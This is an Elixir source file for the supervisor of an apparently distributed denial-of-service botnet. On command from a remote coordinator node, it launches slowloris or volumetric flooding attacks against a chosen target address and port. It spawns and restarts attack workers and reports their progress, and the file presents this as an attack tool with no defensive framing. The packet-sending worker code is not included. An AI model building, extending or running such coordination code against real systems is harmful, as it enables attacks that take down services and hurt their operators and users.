defmodule AttackSupervisor do
  require AttackWorker
  require Logger

  # Supervisor for attack workers. Subscribes to an attack coordinator and awaits messages to start attacks. Monitors the active workers and supplies the coordinator with the current status.

  # Spawns the supervisor process with the node the attack coordinator runs on.
  def start_link(node) do
    pid = spawn_link(fn -> start(node) end)
    {:ok, pid}
  end

  # Setup function for the supervisor.
  defp start(node) do
    Process.flag(:trap_exit, true)
    Process.register(self(), :attack_supervisor)
    send({:attack_coordinator, node}, {:subscribe, Node.self()})
    Logger.info("Subscription sent to #{inspect(node)}")
    loop(false, [], {:attack_coordinator, node}, %{})
  end


  # start_workers could do with more error checking


  defp start_workers(attack_type, worker_count, target_address, target_port) do
    start_workers(attack_type, worker_count, target_address, target_port, nil)
  end


  defp start_workers(attack_type, worker_count, target_address, target_port, transmission_interval) do
    start_workers(attack_type, worker_count, target_address, target_port, transmission_interval, [])
  end


  # Recursive stop condition for starting workers.
  defp start_workers(_, 0, _, _, _, started_workers) do
    {:ok, started_workers}
  end

  # Recursively start and link attack workers with the given parameters
  defp start_workers(attack_type, worker_count, target_address, target_port, transmission_interval, started_workers) do
    pid = AttackWorker.start_link(attack_type, target_address, target_port, transmission_interval)
    start_workers(
      attack_type,
      worker_count - 1,
      target_address,
      target_port,
      transmission_interval,
      [pid | started_workers]
    )
  end

  defp stop_workers([]) do
    :ok
  end

  defp stop_workers([pid | worker_list]) do
    AttackWorker.stop(pid)
    stop_workers(worker_list)
  end

  # Set the processing flag to false when all the workers are done to signal that the attack is complete
  defp loop(true, active_workers, coordinator, _) when length(active_workers) == 0 do
    send(coordinator, {:attack_update, Node.self(), false})
    loop(false, [], coordinator, %{})
  end

  # Main event loop
  defp loop(processing, active_workers, coordinator, current_attack) do
    receive do
      # Handle normal exits from workers
      {:EXIT, from, :normal} ->
        Logger.info("Worker (#{inspect from}) exited normally. Remaining workers: #{length(active_workers) - 1}")
        send(coordinator, {:attack_update, Node.self(), true, length(active_workers) - 1})
        loop(processing, List.delete(active_workers, from), coordinator, current_attack)

      # Handle worker errors
      {:EXIT, from, reason} ->
        Logger.info("Worker terminated: #{reason}. Restarting...")

        {_, worker_pids} = start_workers(
          current_attack[:attack_type],
          1,
          current_attack[:target_address],
          current_attack[:target_port],
          current_attack[:transmission_interval]
        )

        loop(
          processing,
          [List.first(worker_pids) | List.delete(active_workers, from)],
          coordinator,
          current_attack
        )


      {:start_slowloris, target_address, target_port, workers, transmission_interval} ->
        if processing do
          send(coordinator, {:error, :processing})
          loop(processing, active_workers, coordinator, current_attack)
        else
          Logger.info("Starting slowloris attack:")
          Logger.info("\tTarget: #{target_address}")
          Logger.info("\tPort: #{target_port}")
          Logger.info("\tWorkers: #{workers}")
          Logger.info("\tTransmission interval: #{transmission_interval}ms")

          case start_workers("slowloris", workers, target_address, target_port, transmission_interval) do
            {:ok, worker_pids} ->
              send(coordinator, {:attack_update, Node.self(), true, workers})
              loop(
                true,
                worker_pids,
                coordinator,
                %{
                  attack_type: "slowloris",
                  target_address: target_address,
                  target_port: target_port,
                  workers: workers,
                  transmission_interval: transmission_interval
                }
              )

            # Technically doesn't handle errors properly as some workers may have started when the error occcurs
            {:error, reason} ->
              send(coordinator, {:error, reason})
              loop(processing, 0, coordinator, current_attack)
          end
        end

      {:start_volumetric, target_address, target_port, workers} ->
        if processing do
          send(coordinator, {:error, :processing})
          loop(processing, active_workers, coordinator, current_attack)
        else
          Logger.info("Starting volumetric attack:")
          Logger.info("\tTarget: #{target_address}")
          Logger.info("\tPort: #{target_port}")
          Logger.info("\tWorkers: #{workers}")

          case start_workers("volumetric", workers, target_address, target_port) do
            {:ok, worker_pids} ->
              send(coordinator, {:attack_update, Node.self(), true, workers})
              loop(
                true,
                worker_pids,
                coordinator,
                %{
                  attack_type: "volumetric",
                  target_address: target_address,
                  target_port: target_port,
                  workers: workers,
                  transmission_interval: nil
                }
              )

            # Technically doesn't handle errors properly as some workers may have started when the error occcurs
            {:error, reason} ->
              send(coordinator, {:error, reason})
              loop(processing, 0, coordinator, current_attack)
          end
        end

      :stop_attack ->
        Logger.info("#{inspect active_workers}")
        if !processing do
          loop(processing, active_workers, coordinator, current_attack)
        else
          stop_workers(active_workers)
          loop(processing, active_workers, coordinator, current_attack)
        end

      msg ->
        Logger.info("Unhandled message: #{inspect(msg)}")
        loop(processing, active_workers, coordinator, current_attack)
    end
  end
end
